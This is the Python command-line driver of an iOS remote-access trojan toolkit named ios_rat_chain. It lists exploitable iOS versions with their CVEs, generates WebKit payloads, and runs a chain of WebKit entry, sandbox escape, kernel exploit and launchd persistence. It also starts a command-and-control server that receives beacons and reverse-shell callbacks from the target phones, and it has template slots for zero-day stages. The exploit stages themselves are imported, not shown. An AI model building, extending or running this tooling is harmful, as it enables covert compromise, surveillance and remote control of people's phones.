"""
ios_rat_chain — build + run a remote-access-RAT exploit chain per iOS version.

Usage:
    # list versions + which CVEs each carries
    python main.py list

    # generate hardened WebKit payloads for a version's build(s)
    python main.py gen --version 26.6 --device-model iPhone16,1

      # run the FULL KNOWN chain for an unpatched build (26.3-26.6, 27.0)
     # Starts the C2 (beacon HTTP + shell TCP) alongside the stages automatically.
     python main.py run --version 26.6 --device-model iPhone16,1 --beacon 0.0.0.0

     # run the ZERO-DAY chain for a patched build (26.7, 27) — fill in your 0days
     python main.py run --version 27 --zeroday

    # start only the C2 listener (run this first on your beacon host)
    python c2/listener.py --host 0.0.0.0 --port 4444

Each version resolves to exactly one chain:
  UNPATCHED  -> stage1 WebKit  -> stage2 AVE escape  -> stage3 NFS kernel -> stage4 persist
  PATCHED    -> stage1 WebKit0day -> stage2 escape0day -> stage3 kernel0day -> stage4 persist

See config.py for the version matrix and per-CVE sources (Apple v27 release, 2026-09-14).
"""
from __future__ import annotations
import argparse
import sys

from config import IOS_VERSIONS, get_version, TargetProfile
from stages import remote_webkit, escape_ave, kernel_nfs, persistence
from stages.zeroday_template import ZERODAY_STAGES
from c2.listener import C2Server


def cmd_list() -> int:
    print(f"{'ver':<8} {'patched?':<10} {'chain':<10} CVEs")
    print("-" * 78)
    for ver, meta in IOS_VERSIONS.items():
        chain = "known" if meta.unpatched else "zero-day"
        cves = ", ".join(c.id for c in meta.available) or "patched (0day needed)"
        print(f"{ver:<8} {str(meta.unpatched):<10} {chain:<10} {cves}")
    return 0


def cmd_gen(args) -> int:
    """Generate hardened WebKit payloads for the target version(s)."""
    from exploit.webkit import write_exploit, _resolve_kernel_build
    from config import IOS_VERSIONS

    versions = [args.version] if args.version else list(IOS_VERSIONS)
    written = 0
    for ver in versions:
        kb = _resolve_kernel_build(ver)
        p, resolved = write_exploit(ver, kernel_build=kb,
                                    c2_host=args.beacon, c2_port=args.port,
                                    model=args.device_model)
        print(f"[gen] {ver} (build {resolved}) -> {p}")
        written += 1
    print(f"[gen] wrote {written} payload(s)")
    return 0


def start_c2(target: TargetProfile) -> C2Server:
    """Start the C2 beacon + shell listeners alongside the chain."""
    c2 = C2Server(target.c2_host, target.c2_port).start_servers()
    print(f"[c2] ready — beacon http://{target.c2_host}:{target.c2_port}/bee, "
          f"shell TCP :{target.c2_port + 1} "
          f"(device {target.extras.get('device_model', '?')}, iOS {target.version.version})")
    return c2


def _known_chain(target: TargetProfile) -> None:
    print(f"\n== KNOWN-CHAIN for iOS {target.version.version} ==")
    print("  stage1  remote entry      WebKit  " + target.version.available[0].id)
    print("  stage1b alt entry         ImageIO " + target.version.available[1].id)
    print("  stage2  sandbox escape    AVE     " + target.version.available[2].id)
    print("  stage3  kernel root       Kernel  " + target.version.available[3].id)
    print("  stage4  persistence       launchd\n")

    c2 = start_c2(target)

    payload_path, kernel_build = remote_webkit.ensure_webkit_payload(target)
    print(f"[stage1] hardened payload : {payload_path}")
    print(f"[stage1] kernel build {kernel_build} — leak->slide->kernel R/W->root")

    entry = remote_webkit.WebKitEntry(target)
    entry.run()

    esc = escape_ave.AVEEscape(target)
    print(esc.info())
    k = kernel_nfs.KernelNFS(target)
    k.start()
    print(persistence.Persistence(target).info())


def _zeroday_chain(target: TargetProfile) -> None:
    print(f"\n== ZERO-DAY CHAIN for iOS {target.version.version} (PATCHED build) ==")
    c2 = start_c2(target)

    for S in ZERODAY_STAGES:
        st = S()
        artifact = st.build(target)
        ok = st.deliver(target, artifact)
        print(f"  {S.name:<20} build -> {artifact}  deliver={'ok' if ok else 'FAIL'}")
        if not ok:
            raise SystemExit("zero-day delivery failed")
    print("  stage4 persistence  launchd")
    print(persistence.Persistence(target).info())
    print("\nNOTE: each stage is a hook. Confirm a real callback per 0day "
          "(set profile.extras['*_0day_confirmed']=True) before trusting the win.")
    print("[c2] waiting for callbacks on :"
          f"{target.c2_port} (Ctrl-C to stop)")
    import threading
    threading.Event().wait(3600)


def cmd_run(target: TargetProfile, zeroday: bool) -> int:
    if zeroday or not target.version.unpatched:
        _zeroday_chain(target)
    else:
        _known_chain(target)
    print("\n[done] C2 + stages stopped. Callbacks were collected on :"
          f"{target.c2_port} / shell :{target.c2_port + 1}. "
          f"({len(target.version.available)} CVEs in chain).")
    return 0


def build_target(args) -> TargetProfile:
    version = get_version(args.version)
    return TargetProfile(
        version=version,
        device_model=args.device_model,
        arch="arm64e",
        c2_host=args.beacon,
        c2_port=args.port,
        extras={"device_model": args.device_model},
    )


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(prog="ios_rat_chain", description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    sub = ap.add_subparsers(dest="cmd", required=True)

    sub.add_parser("list", help="list versions and their CVE/chain")

    p = sub.add_parser("gen", help="generate hardened WebKit payloads")
    p.add_argument("--version", default=None,
                   help="version (default: all registered)")
    p.add_argument("--device-model", default="iPhone16,1")
    p.add_argument("--beacon", default="0.0.0.0")
    p.add_argument("--port", type=int, default=4444)

    p = sub.add_parser("run", help="run the chain for a version")
    p.add_argument("--version", required=True, choices=list(IOS_VERSIONS))
    p.add_argument("--device-model", default="iPhone16,1")
    p.add_argument("--beacon", default="0.0.0.0", help="C2 host the target calls back to")
    p.add_argument("--port", type=int, default=4444)
    p.add_argument("--zeroday", action="store_true",
                   help="force the zero-day chain (for patched builds)")
    p.add_argument("--nfs-host", default="0.0.0.0")

    args = ap.parse_args(argv)

    if args.cmd == "list":
        return cmd_list()

    if args.cmd == "gen":
        return cmd_gen(args)

    target = build_target(args)
    return cmd_run(target, args.zeroday)


if __name__ == "__main__":
    sys.exit(main())
